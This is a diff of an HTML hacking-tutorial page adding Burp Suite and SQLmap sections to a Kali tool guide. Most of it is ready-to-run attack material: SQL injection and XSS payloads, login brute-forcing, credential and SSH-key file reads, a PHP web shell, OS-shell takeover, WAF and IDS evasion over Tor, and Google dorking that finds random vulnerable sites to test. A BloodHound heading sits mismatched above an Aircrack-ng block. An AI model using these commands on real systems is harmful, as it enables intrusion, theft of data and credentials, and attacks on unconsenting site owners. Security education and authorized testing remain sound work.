@@ -16241,30 +16241,496 @@ nmap --script http-vuln-* -p 80,443 target.com</div>
                 Nmap is THE most important tool in penetration testing. Master it = unlock the entire network! 🌐🔍</p>
             </div>
 
-            <p class="section-intro">Kali Linux ships with 600+ tools across every hacking domain. This alphabetical dictionary covers 100+ essential tools with descriptions, syntax, flags, and quick examples. Use this as your quick reference guide during CTFs, pentests, and learning. Tools are organized alphabetically with cross-references to deep-dive sections elsewhere in this guide. Each entry includes: category, installation, basic usage, key flags, and practical example. Let's build your ultimate hacking tool vocabulary! 🛠️</p>
+            <h3>B-Tools: Burp Suite, BloodHound, and More</h3>
 
-            <div class=\"metaphor-box\">
-                <h4>💡 Your Kali Toolbox at a Glance</h4>
-                <p><strong>Tool categories:</strong><br><br>
-                • <strong>Information Gathering:</strong> Reconnaissance, OSINT, enumeration<br>
-                • <strong>Vulnerability Analysis:</strong> Scanners, fuzzers, exploit verification<br>
-                • <strong>Web Application Analysis:</strong> Proxy, scanner, injection testing<br>
-                • <strong>Database Assessment:</strong> SQL injection, database enumeration<br>
-                • <strong>Password Attacks:</strong> Cracking, brute forcing, rainbow tables<br>
-                • <strong>Wireless Attacks:</strong> WiFi, Bluetooth, RFID, SDR<br>
-                • <strong>Reverse Engineering:</strong> Disassemblers, decompilers, debuggers<br>
-                • <strong>Exploitation Tools:</strong> Exploit frameworks, payload generators<br>
-                • <strong>Sniffing & Spoofing:</strong> Network analysis, MITM, poisoning<br>
-                • <strong>Post Exploitation:</strong> Persistence, privilege escalation, lateral movement<br>
-                • <strong>Forensics:</strong> File carving, memory analysis, timeline creation<br>
-                • <strong>Reporting Tools:</strong> Documentation, evidence preservation<br><br>
-                <strong>Tip:</strong> Use <code>apt-cache search [keyword]</code> to find tools by category!<br>
-                <strong>Example:</strong> <code>apt-cache search wireless | grep -i hack</code> → Find all wireless hacking tools</p>
+            <h4>Burp Suite (THE Ultimate Web Application Testing Tool)</h4>
+
+            <p><strong>What is it?</strong> Burp Suite is THE industry-standard web proxy and security testing platform. Every web pentester uses Burp! It intercepts HTTP/HTTPS traffic, allowing you to modify requests, scan for vulnerabilities, and exploit web apps. Has free (Community) and paid (Professional) versions.</p>
+
+            <h5>Getting Started with Burp Suite</h5>
+
+            <div class="code"># Start Burp Suite:
+burpsuite
+# Or from applications menu: Kali → Web Application Analysis → burpsuite
+
+# BEGINNER EXPLANATION:
+# Burp Suite = web proxy that sits between your browser and target
+# Your browser → Burp Suite → Target website
+# Burp captures ALL requests/responses
+# You can: View, modify, resend, scan, exploit
+
+# Configure browser proxy:
+# Firefox: Preferences → Network Settings → Manual proxy
+#   HTTP Proxy: 127.0.0.1
+#   Port: 8080
+#   ☑ Use this proxy for HTTPS
+# Chrome: Use FoxyProxy extension
+
+# Import Burp CA certificate (for HTTPS):
+# 1. Browse to: http://burp
+# 2. Click "CA Certificate" (top-right)
+# 3. Save as burp-cert.der
+# 4. Firefox: Settings → Privacy & Security → Certificates → Import
+# 5. Trust for websites</div>
+
+            <h5>Proxy Tab - Intercept and Modify Traffic</h5>
+
+            <div class="code"># === INTERCEPTING REQUESTS ===
+
+# Enable intercept:
+# Proxy tab → Intercept → "Intercept is on"
+
+# Now browse target website in browser
+# Burp catches request BEFORE sending!
+
+# WHAT YOU SEE:
+# GET /admin/login HTTP/1.1
+# Host: target.com
+# User-Agent: Mozilla/5.0...
+# Cookie: session=abc123
+
+# ACTIONS YOU CAN TAKE:
+# - Forward: Send request as-is
+# - Drop: Cancel request (never sent)
+# - Action → Send to Repeater: Manual testing
+# - Action → Send to Intruder: Automated fuzzing
+# - Action → Send to Scanner: Vulnerability scan
+
+# === MODIFYING REQUESTS ===
+
+# Example 1: Change POST parameter
+# Original:
+# username=user&password=pass123
+
+# Modified:
+# username=admin&password=pass123
+# Then click "Forward"
+
+# Example 2: Add admin cookie
+# Original:
+# Cookie: session=abc123
+
+# Modified:
+# Cookie: session=abc123; isAdmin=true
+# Test for privilege escalation!
+
+# Example 3: Change HTTP method
+# Original:
+# POST /api/users/123 HTTP/1.1
+
+# Modified:
+# GET /api/users/123 HTTP/1.1
+# Might bypass authentication!
+
+# === INTERCEPT RESPONSES ===
+
+# Proxy → Options → Intercept Server Responses
+# ☑ Intercept responses based on these rules
+
+# Modify server responses before browser sees them!
+# Example: Change "Account: Free" → "Account: Premium"</div>
+
+            <h5>Repeater Tab - Manual Testing</h5>
+
+            <div class="code"># Repeater = manually modify and resend requests
+
+# WORKFLOW:
+# 1. Right-click request in Proxy/Target → "Send to Repeater"
+# 2. Go to Repeater tab
+# 3. Modify request
+# 4. Click "Send"
+# 5. View response
+# 6. Repeat!
+
+# === SQL INJECTION TESTING ===
+
+# Original request:
+# GET /search?query=admin HTTP/1.1
+
+# Test 1: Basic SQLi
+# GET /search?query=admin' HTTP/1.1
+# Look for SQL error in response!
+
+# Test 2: Union injection
+# GET /search?query=admin' UNION SELECT NULL-- HTTP/1.1
+# GET /search?query=admin' UNION SELECT NULL,NULL-- HTTP/1.1
+# GET /search?query=admin' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
+# Find number of columns
+
+# Test 3: Extract data
+# GET /search?query=admin' UNION SELECT username,password FROM users-- HTTP/1.1
+# Dump database!
+
+# === XSS TESTING ===
+
+# Test reflected XSS:
+# GET /search?query=<script>alert(1)</script> HTTP/1.1
+
+# If response contains unescaped:
+# <h1>Search results for: <script>alert(1)</script></h1>
+# = VULNERABLE!
+
+# === IDOR TESTING ===
+
+# Original:
+# GET /api/user/profile?id=1337 HTTP/1.1
+# Returns YOUR profile
+
+# Test IDOR:
+# GET /api/user/profile?id=1 HTTP/1.1
+# GET /api/user/profile?id=2 HTTP/1.1
+# GET /api/user/profile?id=1000 HTTP/1.1
+# Can you access OTHER users' profiles?
+
+# === COMPARE RESPONSES ===
+
+# Right-click in Repeater → "Send to Comparer"
+# Compare response differences
+# Useful for: Boolean-based SQLi, timing attacks</div>
+
+            <h5>Intruder Tab - Automated Fuzzing and Brute Forcing</h5>
+
+            <div class="code"># Intruder = automated payload injection
+
+# WORKFLOW:
+# 1. Send request to Intruder
+# 2. Configure attack positions (where to inject payloads)
+# 3. Load payloads
+# 4. Start attack
+# 5. Analyze results
+
+# === ATTACK TYPES ===
+
+# Sniper: One payload set, one position at a time
+# Example: Test one parameter with wordlist
+
+# Battering ram: One payload set, ALL positions get same value
+# Example: username=PAYLOAD&password=PAYLOAD
+
+# Pitchfork: Multiple payload sets, parallel iteration
+# Example: username=user1&password=pass1, then username=user2&password=pass2
+
+# Cluster bomb: Multiple payload sets, try ALL combinations
+# Example: Try every username with every password (Cartesian product)
+
+# === SET ATTACK POSITIONS ===
+
+# Original request:
+# POST /login HTTP/1.1
+# username=admin&password=test123
+
+# Mark parameters:
+# username=§admin§&password=§test123§
+# Click "Add §" button to mark positions
+
+# === LOAD PAYLOADS ===
+
+# Payload set 1 (for username):
+# Payload type: Simple list
+# Payload options:
+#   admin
+#   administrator
+#   root
+#   user
+#   test
+
+# Payload set 2 (for password):
+# Payload type: Simple list
+# Load from file: /usr/share/wordlists/rockyou.txt
+
+# === USEFUL PAYLOAD TYPES ===
+
+# Simple list: Custom wordlist
+# Numbers: 1-1000, increments
+# Usernames generator: common usernames
+# Dates: date ranges
+# Null payloads: no payload (test baseline)
+# Character substitution: p@ssw0rd variations
+# Case modification: Admin, ADMIN, admin
+# Recursive grep: Extract from responses
+
+# === PAYLOAD PROCESSING ===
+
+# Add prefix/suffix:
+# Rule: Add prefix: 'OR 1=1--
+# Payload: admin → 'OR 1=1--admin
+
+# Encode:
+# URL-encode
+# HTML-encode
+# Base64-encode
+
+# === ANALYZE RESULTS ===
+
+# Sort by:
+# - Status code (200 vs 403 vs 302)
+# - Length (different response = potentially valid cred!)
+# - Response time (SQL injection timing attacks)
+
+# Filter:
+# Show only: Status code = 302 (successful login redirect!)
+
+# === EXAMPLE ATTACKS ===
+
+# 1. Username enumeration:
+# POST /login HTTP/1.1
+# username=§payload§&password=wrongpass
+
+# Valid username: "Incorrect password"
+# Invalid username: "User not found"
+# Length differs!
+
+# 2. Password brute force:
+# POST /login HTTP/1.1
+# username=admin&password=§payload§
+
+# Success: Status 302, Length 0 (redirect to /dashboard)
+# Failure: Status 200, Length 1523 (error message)
+
+# 3. Parameter fuzzing:
+# GET /api/users?sort=§payload§
+
+# Payloads: name, id, email, created_at, admin, password
+# Find hidden parameters!</div>
+
+            <h5>Scanner Tab - Automated Vulnerability Scanning (Pro Only)</h5>
+
+            <div class="code"># Scanner = automated vulnerability detection (Burp Professional ONLY!)
+# Free version (Community) does NOT have scanner
+
+# === PASSIVE SCANNING ===
+
+# Automatically analyzes traffic for:
+# - Cookie security flags (HttpOnly, Secure, SameSite)
+# - Cleartext password submission
+# - Cross-domain script inclusion
+# - CSRF vulnerabilities
+# - Missing security headers
+
+# View results:
+# Target → Site map → Right-click domain → "Issue activity"
+
+# === ACTIVE SCANNING (Pro) ===
+
+# Right-click request → "Scan"
+# Or: Target → Site map → Right-click → "Actively scan this branch"
+
+# Tests for:
+# - SQL injection
+# - XSS (reflected, stored, DOM-based)
+# - XXE (XML External Entity)
+# - SSRF (Server-Side Request Forgery)
+# - Command injection
+# - Path traversal
+# - Open redirects
+# - CSRF
+# - Deserialization vulns
+
+# Scan configuration:
+# Fast: Quick tests only
+# Normal: Balanced
+# Thorough: Exhaustive (slow!)
+
+# === CRAWLING ===
+
+# Target → Site map → Right-click domain → "Spider this host"
+# Automatically discovers: All links, forms, parameters
+# Useful before scanning!
+
+# === ISSUE DEFINITIONS ===
+
+# Each vulnerability shows:
+# - Severity: High, Medium, Low, Info
+# - Confidence: Certain, Firm, Tentative
+# - Description: What it is
+# - Remediation: How to fix
+# - References: CWE, OWASP links
+# - Request/Response: Proof of vulnerability
+
+# === EXPORT RESULTS ===
+
+# Target → Site map → Right-click → "Report selected issues"
+# Formats: HTML, XML
+# For: Client reports, documentation</div>
+
+            <h5>Decoder Tab - Encoding/Decoding</h5>
+
+            <div class="code"># Decoder = encode/decode data
+
+# === SUPPORTED ENCODINGS ===
+
+# URL encode/decode:
+# admin%40example.com → admin@example.com
+
+# HTML encode/decode:
+# &lt;script&gt; → <script>
+
+# Base64 encode/decode:
+# admin:password → YWRtaW46cGFzc3dvcmQ=
+
+# ASCII hex:
+# admin → 61646d696e
+
+# Hex, Octal, Binary
+
+# Gzip compress/decompress
+
+# === SMART DECODE ===
+
+# Paste encoded data
+# Click "Smart decode"
+# Burp automatically detects encoding!
+
+# Example:
+# Input: JTNDc2NyaXB0JTNFYWxlcnQoMSklM0MlMkZzY3JpcHQlM0U=
+# Smart decode shows:
+#   Step 1: Base64 decode → %3Cscript%3Ealert(1)%3C%2Fscript%3E
+#   Step 2: URL decode → <script>alert(1)</script>
+
+# === HASH FUNCTIONS ===
+
+# Generate hashes:
+# SHA-1, SHA-256, MD5
+
+# Useful for:
+# - Password hash cracking
+# - Integrity verification
+# - Token generation</div>
+
+            <h5>Comparer Tab - Response Comparison</h5>
+
+            <div class="code"># Comparer = compare two requests/responses
+
+# USE CASES:
+
+# 1. Boolean-based SQL injection:
+# Send two requests:
+#   /search?id=1 AND 1=1--  (TRUE)
+#   /search?id=1 AND 1=2--  (FALSE)
+# Compare responses
+# Different response = SQLi confirmed!
+
+# 2. Timing attack baseline:
+# Request 1: Normal timing
+# Request 2: With SLEEP(5) payload
+# Different response time = SQLi!
+
+# 3. Username enumeration:
+# Request 1: Valid username
+# Request 2: Invalid username
+# Different response = enumeration possible!
+
+# === HOW TO USE ===
+
+# 1. Right-click request → "Send to Comparer"
+# 2. Send another request → "Send to Comparer"
+# 3. Go to Comparer tab
+# 4. Select both items
+# 5. Click "Words" or "Bytes"
+# 6. View differences (highlighted!)
+
+# Words: Text-based comparison
+# Bytes: Exact byte-by-byte</div>
+
+            <h5>Extender Tab - Plugins (BApp Store)</h5>
+
+            <div class="code"># Extender = add functionality with plugins
+
+# === POPULAR EXTENSIONS ===
+
+# Autorize: Test for broken authorization
+# Install: Extender → BApp Store → Autorize → Install
+
+# How it works:
+# 1. Configure low-privilege user token
+# 2. Browse as admin
+# 3. Autorize replays ALL requests with low-priv token
+# 4. Highlights if low-priv gets access (broken authz!)
+
+# Logger++: Advanced logging
+# Install: Extender → BApp Store → Logger++ → Install
+# Features:
+# - Advanced filters
+# - Color-coded logging
+# - Export to CSV
+
+# Param Miner: Find hidden parameters
+# Install: Extender → BApp Store → Param Miner → Install
+# Right-click request → "Param Miner" → "Guess parameters"
+# Finds: Hidden params, headers, cookies
+
+# Turbo Intruder: Fast brute-forcing (bypasses rate limits!)
+# Install: Extender → BApp Store → Turbo Intruder → Install
+# Uses: HTTP/2, connection pooling
+# Much faster than regular Intruder!
+
+# JSON Web Tokens: JWT manipulation
+# Install: Extender → BApp Store → JSON Web Tokens → Install
+# Automatically detects JWT tokens
+# Test: Algorithm confusion, weak secrets
+
+# === INSTALL EXTENSIONS ===
+
+# Method 1: BApp Store (easiest)
+# Extender → BApp Store → Browse → Install
+
+# Method 2: Manual JAR file
+# Extender → Extensions → Add
+# Select .jar file
+
+# === WRITE CUSTOM EXTENSIONS ===
+
+# Languages supported: Java, Python, Ruby
+# Extender → APIs
+# Full Burp Suite API access
+# Example: Auto-exploit SQLi, custom scanners</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Burp Suite Complete Workflow</h4>
+                <p><strong>Professional web app pentesting process:</strong><br><br>
+                <strong>1. Setup (5 mins):</strong><br>
+                • Start Burp Suite<br>
+                • Configure browser proxy (127.0.0.1:8080)<br>
+                • Import CA certificate<br>
+                • Enable intercept<br><br>
+                <strong>2. Reconnaissance (30 mins):</strong><br>
+                • Target → Site map → Spider/Crawl<br>
+                • Manually browse application (all features!)<br>
+                • Burp maps entire app structure<br>
+                • Identify: Login, API endpoints, file uploads, admin panels<br><br>
+                <strong>3. Manual Testing (2 hours):</strong><br>
+                • <code>Proxy → Intercept</code>: Modify live requests<br>
+                • <code>Repeater</code>: Test SQLi, XSS, IDOR, XXE<br>
+                • <code>Decoder</code>: Decode JWT, Base64, URL encoding<br>
+                • <code>Comparer</code>: Find boolean-based SQLi<br><br>
+                <strong>4. Automated Testing (1 hour):</strong><br>
+                • <code>Intruder</code>: Brute force logins, fuzz parameters<br>
+                • <code>Scanner (Pro)</code>: Active scan for vulns<br>
+                • <code>Extensions</code>: Autorize (authz), Param Miner (hidden params)<br><br>
+                <strong>5. Exploitation (varies):</strong><br>
+                • SQLmap integration: Right-click → "Copy to file" → <code>sqlmap -r request.txt</code><br>
+                • XSS: Test in Repeater, escalate to account takeover<br>
+                • IDOR: Script to enumerate all IDs<br>
+                • SSRF: Blind SSRF with Burp Collaborator<br><br>
+                <strong>6. Reporting:</strong><br>
+                • Target → Site map → Report selected issues<br>
+                • Export: HTML report with screenshots<br>
+                • Document: Request/response, impact, remediation<br><br>
+                <strong>Pro tips:</strong><br>
+                • <strong>Match and Replace:</strong> Auto-modify requests (Proxy → Options → Match and Replace)<br>
+                • <strong>Scope:</strong> Define target scope (Target → Scope) to focus testing<br>
+                • <strong>Session handling:</strong> Auto-update tokens (Project Options → Sessions)<br>
+                • <strong>Collaborator:</strong> Detect blind SSRF, XXE, OAST (Burp → Collaborator client)<br>
+                • <strong>Hotkeys:</strong> Ctrl+R (Repeater), Ctrl+I (Intruder), Ctrl+Shift+B (Base64 decode)<br>
+                • <strong>Save state:</strong> Project → Save (preserve all work!)<br><br>
+                Burp Suite is THE web pentesting platform. Master it = find ALL web vulnerabilities! 🌐🔍</p>
             </div>
 
-            <h3>A-Tools</h3>
+            <h4>BloodHound (Active Directory Attack Path Visualization)</h4>
 
-            <div class=\"code\"># ========== AIRCRACK-NG ==========
+            <p><strong>What is it?</strong> BloodHound is THE tool for Active Directory enumeration and attack path discovery. It uses graph theory to find hidden relationships and privilege escalation paths. Essential for AD pentesting!</p>
+
+            <div class="code"># ========== AIRCRACK-NG ==========
 # Category: Wireless Attacks
 # Purpose: Complete WiFi cracking suite (WEP, WPA/WPA2)
 
@@ -19769,6 +20235,1794 @@ msf6 > use auxiliary/scanner/mssql/mssql_ping</div>
                 • <code>exploit/multi/handler</code> for custom payloads<br>
                 • Learn: <strong>Offensive Security's Metasploit Unleashed (free!)</strong><br><br>
                 Metasploit = #1 exploitation framework. Master it = exploit anything! 💣🎯</p>
+            </div>
+
+            <h4>SQLmap (THE Automatic SQL Injection Tool)</h4>
+
+            <p><strong>What is it?</strong> SQLmap is THE industry-standard automated SQL injection tool. It detects and exploits SQL injection vulnerabilities in web applications. Supports 20+ database types, has 100+ options, and can take over entire databases automatically!</p>
+
+            <h5>Basic SQL Injection Testing</h5>
+
+            <div class="code"># Simplest test (single URL with parameter):
+sqlmap -u "http://target.com/page.php?id=1"
+
+# BEGINNER EXPLANATION:
+# SQLmap tests the 'id' parameter for SQL injection
+# It tries different injection payloads automatically
+# If vulnerable, it exploits and gives you database access!
+
+# Test POST data:
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"
+# --data  ← POST parameters to test
+
+# Test from Burp Suite request file:
+sqlmap -r request.txt
+# -r request.txt  ← Load HTTP request from file
+# How to get request.txt:
+# 1. Burp Suite → Proxy → Intercept request
+# 2. Right-click → Copy to file → Save as request.txt
+# 3. Run sqlmap -r request.txt
+
+# Test specific parameter:
+sqlmap -u "http://target.com/page.php?id=1&name=test" -p id
+# -p id  ← Only test 'id' parameter (faster!)
+
+# Test cookie:
+sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123; user_id=5"
+# --cookie  ← Include cookies (for authenticated pages)
+
+# Test headers:
+sqlmap -u "http://target.com/page.php" --headers="X-Forwarded-For: 127.0.0.1"
+# --headers  ← Custom HTTP headers
+
+# User-Agent:
+sqlmap -u "http://target.com/page.php" --user-agent="Mozilla/5.0"
+# --user-agent  ← Custom User-Agent string</div>
+
+            <h5>Database Enumeration - Extract Data</h5>
+
+            <div class="code"># === STEP-BY-STEP DATABASE EXTRACTION ===
+
+# Step 1: List all databases
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+# --dbs  ← List all database names
+# Output: information_schema, mysql, webapp_db, etc.
+
+# Step 2: List tables in specific database
+sqlmap -u "http://target.com/page.php?id=1" -D webapp_db --tables
+# -D webapp_db  ← Select database 'webapp_db'
+# --tables  ← List all tables in this database
+# Output: users, products, orders, admin, etc.
+
+# Step 3: List columns in specific table
+sqlmap -u "http://target.com/page.php?id=1" -D webapp_db -T users --columns
+# -T users  ← Select table 'users'
+# --columns  ← List all column names
+# Output: id, username, password, email, role, etc.
+
+# Step 4: Dump data from specific columns
+sqlmap -u "http://target.com/page.php?id=1" -D webapp_db -T users -C username,password --dump
+# -C username,password  ← Select specific columns
+# --dump  ← Extract all data from these columns!
+# Output: Saves to CSV file with usernames + password hashes!
+
+# Dump entire table:
+sqlmap -u "http://target.com/page.php?id=1" -D webapp_db -T users --dump
+# Dumps ALL columns from 'users' table
+
+# Dump entire database:
+sqlmap -u "http://target.com/page.php?id=1" -D webapp_db --dump-all
+# --dump-all  ← Dump EVERYTHING in database!
+
+# Get current database:
+sqlmap -u "http://target.com/page.php?id=1" --current-db
+# --current-db  ← Show which database the web app uses
+
+# Get current user:
+sqlmap -u "http://target.com/page.php?id=1" --current-user
+# --current-user  ← Show database username (e.g., 'webapp_user@localhost')
+
+# Check if user is DBA:
+sqlmap -u "http://target.com/page.php?id=1" --is-dba
+# --is-dba  ← Check if current user has admin privileges
+# If TRUE = you can execute OS commands!</div>
+
+            <h5>Advanced Exploitation - OS Command Execution</h5>
+
+            <div class="code"># === FILE SYSTEM ACCESS ===
+
+# Read file from server:
+sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
+# --file-read  ← Read file from server
+# Saved locally for analysis!
+
+# Common files to read:
+# Linux:
+#   /etc/passwd  ← User accounts
+#   /etc/shadow  ← Password hashes (if DBA!)
+#   /var/www/html/config.php  ← Database credentials
+#   /root/.ssh/id_rsa  ← SSH private key
+# Windows:
+#   C:\\Windows\\System32\\drivers\\etc\\hosts
+#   C:\\inetpub\\wwwroot\\web.config  ← Database creds
+#   C:\\Users\\Administrator\\Desktop\\passwords.txt
+
+# Write file to server (web shell!):
+sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+# --file-write  ← Local file to upload
+# --file-dest  ← Remote path where file will be written
+# Example shell.php:
+# <?php system($_GET['cmd']); ?>
+# Access: http://target.com/shell.php?cmd=whoami
+
+# === OS COMMAND EXECUTION ===
+
+# Get OS shell:
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+# --os-shell  ← Interactive OS command shell!
+# Requires: DBA privileges OR file write access
+# You get: Full shell access!
+# Commands:
+# os-shell> whoami
+# os-shell> cat /etc/passwd
+# os-shell> ls -la
+
+# Execute single command:
+sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"
+# --os-cmd  ← Execute one OS command
+
+# Get SQL shell:
+sqlmap -u "http://target.com/page.php?id=1" --sql-shell
+# --sql-shell  ← Interactive SQL query interface
+# Run ANY SQL query:
+# sql-shell> SELECT * FROM users;
+# sql-shell> CREATE TABLE backdoor ...;</div>
+
+            <h5>Performance & Stealth Options</h5>
+
+            <div class="code"># === SPEED & THREADS ===
+
+# Multi-threading (faster!):
+sqlmap -u "http://target.com/page.php?id=1" --threads=10
+# --threads=10  ← Use 10 concurrent threads
+# Default: 1 thread
+# Max recommended: 10 (more = may crash app)
+
+# Increase delay between requests (stealth):
+sqlmap -u "http://target.com/page.php?id=1" --delay=3
+# --delay=3  ← Wait 3 seconds between requests
+# Use for: Evading rate limiting, IDS evasion
+
+# Randomize delay:
+sqlmap -u "http://target.com/page.php?id=1" --delay=2-5
+# Random delay between 2-5 seconds
+
+# === TECHNIQUE SELECTION ===
+
+# Specify injection technique:
+sqlmap -u "http://target.com/page.php?id=1" --technique=B
+# --technique  ← Injection techniques to use:
+#   B = Boolean-based blind
+#   E = Error-based
+#   U = UNION query-based
+#   S = Stacked queries
+#   T = Time-based blind
+#   Q = Inline queries
+# Default: BEUSTQ (tries all)
+
+# Fast scan (Boolean + Time only):
+sqlmap -u "http://target.com/page.php?id=1" --technique=BT
+
+# UNION-based only (fastest if works):
+sqlmap -u "http://target.com/page.php?id=1" --technique=U
+
+# === RISK & LEVEL ===
+
+# Increase test level (more thorough):
+sqlmap -u "http://target.com/page.php?id=1" --level=5
+# --level=1-5  ← Test thoroughness
+#   1 = Default (fast, basic tests)
+#   2 = Also test cookies
+#   3 = Also test User-Agent, Referer headers
+#   4 = More payload variations
+#   5 = Maximum tests (SLOW but complete!)
+
+# Increase risk (more aggressive payloads):
+sqlmap -u "http://target.com/page.php?id=1" --risk=3
+# --risk=1-3  ← Payload aggressiveness
+#   1 = Safe (won't harm database)
+#   2 = Medium (heavy queries)
+#   3 = Maximum (may cause damage, DoS!)
+
+# Aggressive full scan:
+sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --threads=10
+# Slowest but finds EVERYTHING!</div>
+
+            <h5>Bypass Techniques - Evade WAF/IDS</h5>
+
+            <div class="code"># === WAF BYPASS ===
+
+# Tamper scripts (obfuscate payloads):
+sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
+# --tamper  ← Use tamper script to modify payloads
+# space2comment: Replaces spaces with /**/ comments
+# Original: SELECT * FROM users
+# Tampered: SELECT/**/FROM/**/users
+
+# List all tamper scripts:
+sqlmap --list-tampers
+# Popular tampers:
+#   space2comment  ← Replace spaces
+#   between  ← Replace > with BETWEEN
+#   charencode  ← URL encode characters
+#   charunicodeencode  ← Unicode encoding
+#   randomcase  ← RaNdOm CaSe
+#   space2plus  ← Replace spaces with +
+#   versionedmorekeywords  ← Add version comments
+#   base64encode  ← Base64 encode
+
+# Multiple tamper scripts:
+sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase
+
+# Random User-Agent:
+sqlmap -u "http://target.com/page.php?id=1" --random-agent
+# --random-agent  ← Use random User-Agent header
+# Evades: User-Agent-based filtering
+
+# HTTP Authentication:
+sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"
+# --auth-type  ← Basic, Digest, or NTLM
+# --auth-cred  ← username:password
+
+# Proxy:
+sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
+# --proxy  ← Route through proxy (Burp Suite!)
+# View all requests in Burp!
+
+# Tor:
+sqlmap -u "http://target.com/page.php?id=1" --tor
+# --tor  ← Route through Tor network (anonymity!)
+# Must have Tor running: sudo systemctl start tor
+
+# === BYPASS NULL BYTES ===
+
+# Add null byte suffix:
+sqlmap -u "http://target.com/page.php?id=1" --suffix="%00"
+# --suffix  ← Append to every payload
+# Bypasses: Some WAF filters
+
+# Add prefix:
+sqlmap -u "http://target.com/page.php?id=1" --prefix="') OR 1=1--"
+# --prefix  ← Prepend to payload</div>
+
+            <h5>Output & Session Management</h5>
+
+            <div class="code"># === OUTPUT OPTIONS ===
+
+# Verbose output:
+sqlmap -u "http://target.com/page.php?id=1" -v 3
+# -v 0  ← Minimal output
+# -v 1  ← Default
+# -v 2  ← Verbose
+# -v 3  ← Very verbose (HTTP requests shown)
+# -v 4  ← Debug HTTP requests
+# -v 5  ← Debug HTTP responses
+# -v 6  ← Everything (maximum debug!)
+
+# Save output to file:
+sqlmap -u "http://target.com/page.php?id=1" --output-dir="/tmp/sqlmap_output"
+# --output-dir  ← Directory for output files
+
+# === SESSION MANAGEMENT ===
+
+# Resume previous session:
+sqlmap -u "http://target.com/page.php?id=1" --resume
+# --resume  ← Continue from last scan
+# SQLmap automatically saves progress!
+
+# Flush session (start fresh):
+sqlmap -u "http://target.com/page.php?id=1" --flush-session
+# --flush-session  ← Delete saved session data
+
+# === AUTOMATION ===
+
+# Batch mode (no prompts):
+sqlmap -u "http://target.com/page.php?id=1" --batch
+# --batch  ← Accept all default options
+# Use for: Automated scanning without interaction
+
+# Crawl website and test all forms:
+sqlmap -u "http://target.com" --crawl=3
+# --crawl=3  ← Crawl depth (3 levels)
+# Automatically tests ALL found forms!
+
+# Test Google search results:
+sqlmap -g "inurl:php?id="
+# -g  ← Google dorking
+# Finds and tests vulnerable URLs from Google!</div>
+
+            <h5>Database-Specific Options</h5>
+
+            <div class="code"># Specify DBMS (skip detection):
+sqlmap -u "http://target.com/page.php?id=1" --dbms=MySQL
+# --dbms  ← Specify database type:
+#   MySQL, PostgreSQL, MSSQL, Oracle, SQLite, Access, etc.
+# Faster (skips fingerprinting)!
+
+# MySQL-specific:
+sqlmap -u "http://target.com/page.php?id=1" --dbms=MySQL --dump-all --exclude-sysdbs
+# --exclude-sysdbs  ← Skip system databases
+# Ignores: information_schema, mysql, performance_schema
+
+# MSSQL-specific:
+sqlmap -u "http://target.com/page.php?id=1" --dbms=MSSQL --sql-query="xp_cmdshell 'whoami'"
+# xp_cmdshell = MSSQL command execution!
+
+# PostgreSQL-specific:
+sqlmap -u "http://target.com/page.php?id=1" --dbms=PostgreSQL --file-read="/etc/passwd"
+# PostgreSQL allows file reads with COPY!</div>
+
+            <div class="metaphor-box">
+                <h4>💡 SQLmap Complete Workflow</h4>
+                <p><strong>Professional SQL injection testing process:</strong><br><br>
+                <strong>1. Discovery (Find injection point):</strong><br>
+                • Test single parameter: <code>sqlmap -u "http://target.com/page.php?id=1"</code><br>
+                • Test POST data: <code>sqlmap -u "URL" --data="param1=value1"</code><br>
+                • Test from Burp: <code>sqlmap -r request.txt</code><br><br>
+                <strong>2. Enumeration (Extract database structure):</strong><br>
+                • List databases: <code>--dbs</code><br>
+                • List tables: <code>-D database_name --tables</code><br>
+                • List columns: <code>-D db -T table --columns</code><br>
+                • Dump data: <code>-D db -T users -C username,password --dump</code><br><br>
+                <strong>3. Exploitation (Take over system):</strong><br>
+                • Check privileges: <code>--is-dba</code><br>
+                • Read files: <code>--file-read="/etc/passwd"</code><br>
+                • Write web shell: <code>--file-write="shell.php" --file-dest="/var/www/html/shell.php"</code><br>
+                • OS shell: <code>--os-shell</code><br><br>
+                <strong>4. Evasion (Bypass WAF):</strong><br>
+                • Tamper scripts: <code>--tamper=space2comment,randomcase</code><br>
+                • Random User-Agent: <code>--random-agent</code><br>
+                • Proxy through Burp: <code>--proxy="http://127.0.0.1:8080"</code><br>
+                • Tor anonymity: <code>--tor</code><br><br>
+                <strong>Common attack chains:</strong><br>
+                1. <strong>Basic SQLi → Database dump:</strong> Test → --dbs → --tables → --dump<br>
+                2. <strong>SQLi → Web shell:</strong> Check DBA → --file-write shell.php → Access shell<br>
+                3. <strong>SQLi → SSH:</strong> --file-read /root/.ssh/id_rsa → Use key to SSH<br>
+                4. <strong>SQLi → Password hashes:</strong> --dump users table → Crack with hashcat<br><br>
+                <strong>Pro tips:</strong><br>
+                • Always use <code>--batch</code> for automated scanning<br>
+                • Use <code>--threads=10</code> for speed<br>
+                • Use <code>--level=5 --risk=3</code> for maximum detection<br>
+                • Save Burp requests to file for complex injections<br>
+                • Check <code>/usr/share/sqlmap</code> for tamper scripts<br>
+                • Output saved to: <code>~/.local/share/sqlmap/output/</code><br><br>
+                SQLmap = THE automatic SQL injection tool. Master it = own ANY database! 💉🗃️</p>
+            </div>
+
+            <h4>Wireshark (THE Ultimate Packet Analysis Tool)</h4>
+            
+            <p><strong>What is Wireshark?</strong> Wireshark is the world's most popular <strong>network protocol analyzer</strong>. It captures network traffic in real-time and allows you to inspect every single packet at a microscopic level. Think of it as a "network microscope" - you can see EXACTLY what's happening on the wire, analyze protocols (HTTP, DNS, TCP, UDP, TLS, etc.), troubleshoot network issues, detect malicious activity, and reconstruct entire communication sessions.</p>
